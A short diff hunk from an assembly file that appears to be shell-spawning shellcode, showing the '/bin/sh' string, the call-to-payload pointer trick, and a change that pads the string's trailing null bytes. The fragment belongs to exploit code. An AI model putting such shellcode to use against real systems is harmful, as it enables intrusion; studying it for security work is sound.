@@ -37,7 +37,7 @@ payload:
 
 file_to_run:
         .ascii  "/bin/sh\0"
-        .ascii  "\0"
+        .ascii  "\0\0\0\0\0\0\0\0"
 
 callptr:
     call    payload                      /* push STRING ptr to stack */
